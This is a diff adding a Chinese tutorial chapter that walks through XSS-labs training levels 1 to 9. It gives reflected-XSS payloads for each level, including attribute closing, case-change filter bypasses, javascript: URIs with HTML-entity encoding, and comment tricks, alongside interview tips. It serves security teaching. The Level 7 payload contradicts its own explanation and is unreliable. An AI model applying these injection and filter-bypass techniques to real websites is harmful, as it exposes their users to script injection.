@@ -305,3 +305,141 @@ String safe = Jsoup.clean(userInput, Whitelist.basic());
 | 规范+审计 | 代码会变，扫描要持续跑，innerHTML 是最大的红旗 |
 
 ---
+
+## 第三章：XSS-labs前16关解题
+
+> XSS-labs 和 sqli-labs 同为安全靶场经典，覆盖了从基础反射型到绕过过滤、HTTP头注入、AngularJS框架XSS的渐进式训练场景。
+
+### 3.0 前置知识
+
+在开始解题之前，需要掌握的HTML/JS基础：
+
+**常用XSS事件属性：**
+
+| 事件属性 | 触发时机 | 常用场景 |
+|----------|----------|----------|
+| `onclick` | 元素被点击 | 需要用户交互时 |
+| `onerror` | 资源加载失败 | `<img src=x onerror=...>` — 无需交互 |
+| `onload` | 元素加载完成 | `<body onload=...>` `<svg onload=...>` |
+| `onfocus` | 元素获得焦点 | 配合 `autofocus` 属性自动触发 |
+| `onmouseover` | 鼠标悬停 | 需要用户鼠标经过元素 |
+
+**XSS payload的构造思路：**
+
+```
+确认输出位置 → 判断上下文（HTML文本/属性/JS/URL） → 选择闭合方式 → 构造完整HTML标签+事件 → 遇到过滤就绕过
+```
+
+### 3.1 纯文本回显（Level 1）
+
+Level 1 没有任何过滤，是最简单的反射型XSS：
+
+**源码分析：**
+
+```php
+$str = $_GET["name"];
+echo "<h2 align=center>欢迎用户" . $str . "</h2>";
+```
+
+用户输入直接拼入 `<h2>` 标签的文本内容中。
+
+**Payload：**
+
+```html
+<script>alert(1)</script>
+```
+
+页面变为 `<h2>欢迎用户<script>alert(1)</script></h2>`，浏览器解析到 `<script>` 标签后直接执行。
+
+> 这是唯一不需要任何绕过技巧的一关。
+
+### 3.2 属性值闭合（Level 2 ~ Level 7）
+
+从 Level 2 开始，注入点转移到了HTML标签的属性值中。核心思路变为：**先闭合当前属性，再注入自己的事件属性**。
+
+#### Level 2：双引号属性值闭合
+
+**源码分析：**
+
+```php
+echo "<input name=keyword value=\"" . $str . "\">";
+```
+
+输出到 `<input>` 标签的 `value` 属性中。如果直接输入 `<script>alert(1)</script>`，页面会变成：
+
+```html
+<input name=keyword value="<script>alert(1)</script>">
+```
+
+浏览器将整个 `<script>` 当作 `value` 属性的字符串值，不会执行。
+
+**Payload：**
+
+```html
+" onclick=alert(1)
+```
+
+拼接后：
+
+```html
+<input name=keyword value="" onclick=alert(1)">
+<!--                       ↑ 闭合value    ↑ 注入点击事件 -->
+```
+
+> Level 3 只是单引号闭合（`' onclick=alert(1)`），Level 4 是双引号但 `<>` 被编码，同样用 `" onclick=alert(1)` 即可。
+
+#### Level 5 ~ Level 7：事件属性被过滤
+
+Level 5 将 `on` 替换为 `o_n`，Level 6 过滤了 `on` 和 `href` 等关键字。
+
+**绕过策略：**
+
+| 关卡 | 过滤规则 | Payload | 绕过原理 |
+|------|----------|---------|----------|
+| Level 5 | `on` → `o_n` | `<a href="javascript:alert(1)">click</a>` | 换思路，不用事件属性，改用 `<a>` 标签的 `javascript:` 伪协议 |
+| Level 6 | 过滤 `on`、`href` 等 | `" Onclick=alert(1)` | 大写 `On` 绕过小写关键字匹配 |
+| Level 7 | 过滤 `on`（所有大小写） | `" ONclick=alert(1)` | 双写思路：如果过滤是替换为空，`OONN` → 过滤 → `ON` |
+
+> **面试提示**：面试官若问"on被过滤了怎么办"，先答**大小写**（`On`/`ON`），再答**换思路**（用 `<a href="javascript:">` 等其他标签），最后答**其他事件**（`onfocus` + `autofocus` 无需点击）。
+
+### 3.3 href 伪协议 + HTML 实体编码（Level 8 ~ Level 9）
+
+这两关将注入点换到了 `<a>` 标签的 `href` 属性中。
+
+#### Level 8：script 关键字被替换
+
+**源码分析：**
+
+```php
+$str = strtolower($_GET["name"]);
+$str = str_replace("script", "scr_ipt", $str);
+echo "<a href=\"" . $str . "\">友情链接</a>";
+```
+
+直接输入 `javascript:alert(1)` 会被替换为 `javascr_ipt:alert(1)`，链接失效。
+
+**Payload：**
+
+```html
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
+```
+
+`&#106;` = `j`, `&#97;` = `a`, `&#118;` = `v`, `&#97;` = `a`, `&#115;` = `s`, `&#99;` = `c`, `&#114;` = `r`, `&#105;` = `i`, `&#112;` = `p`, `&#116;` = `t` —— 拼起来就是 `javascript`。
+
+> 这是用户卡得最久的一关。关键理解：后端过滤的是字符串 `script`，但浏览器在解析 `href` 属性时会对HTML实体解码，解码后才得到 `javascript:`，此时已经绕过后端检查。
+
+#### Level 9：增加了URL合法性校验
+
+**额外逻辑**：检查 `href` 值是否包含 `http://`。
+
+**Payload：**
+
+```html
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)//http://
+```
+
+在 `javascript:` 伪协议后添加 `//http://`，`//` 在JS中是单行注释，`http://` 被注释掉但通过了URL检查。
+
+> 核心技巧：利用JS注释 `//` 或 `/* */` 吃掉多余的校验内容。
+
+---
